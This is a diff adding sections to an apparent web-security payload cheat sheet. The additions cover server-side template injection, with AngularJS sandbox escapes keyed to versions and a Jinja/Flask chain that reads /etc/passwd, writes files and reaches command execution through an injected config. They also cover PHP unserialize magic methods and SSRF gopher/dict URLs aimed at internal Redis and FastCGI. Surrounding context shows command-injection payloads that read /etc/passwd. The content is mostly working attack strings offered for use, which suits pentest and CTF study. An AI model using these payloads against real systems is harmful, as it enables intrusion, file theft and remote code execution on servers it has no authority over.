@@ -233,8 +233,41 @@ original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```  
 
-**Template Injection**
+**Server-Side Template Injection (SSTI)**
 
+Tool: https://github.com/epinna/tplmap
+
+Angular JS:
+```
+{{ 7*7 }} => 49
+{{ this }}
+{{ this.toString() }}
+{{ constructor.toString() }}
+{{ constructor.constructor('alert(1)')() }} 2.1 v1.0.1-v1.1.5
+{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }} 2.1 v1.0.1-v1.1.5
+{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) }} 2.3 v1.2.19-v1.2.23
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}} v1.2.24-v1.2.29
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} v1.3.20
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} v1.4.0-v1.4.9
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} v1.5.0-v1.5.8
+{{ [].pop.constructor('alert(1)')() }} 2.8 v1.6.0-1.6.6
+```
+
+Flask/Jinja:
+```
+Dump all used classes
+  {{ ''.__class__.__mro__[2].__subclasses__() }}
+Read File
+  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+Write File
+  {{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}
+RCE
+  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+evil config
+  {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+load config
+  {{ config['RUNCMD']('cat flag',shell=True) }}
+```
 
 ---
 ### XXE
@@ -289,6 +322,17 @@ Note:
 ```
 
 ---
+### PHP Serialize() / Unserialize()
+---
+
+PHP Magic Methods:
+* `construct()`: Object is called when new, but unserialize() is not called
+* `destruct()`: Called when the Object is destroyed
+* `wakeup()`: Called automatically when unserialize
+* `sleep()`: Called when serialize
+* `toString()`: When the object is called as a string
+
+---
 ### Server-Side Request Forgery
 ---
 Summary: Attacker can make requests from a server to target a system's internals (i.e intranet) by bypassing its firewalls.
@@ -312,7 +356,10 @@ curl file:///etc/passwd
 Other Protocols
 ```
 gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
+gopher://127.0.0.1:9000                 // FastCGI
+gopher://127.0.0.1:6379                 // Redis
 ftp://127.0.0.1:20/21
+dict://
 telnet://127.0.0.1:23
 smtp://127.0.0.1:25
 jar://
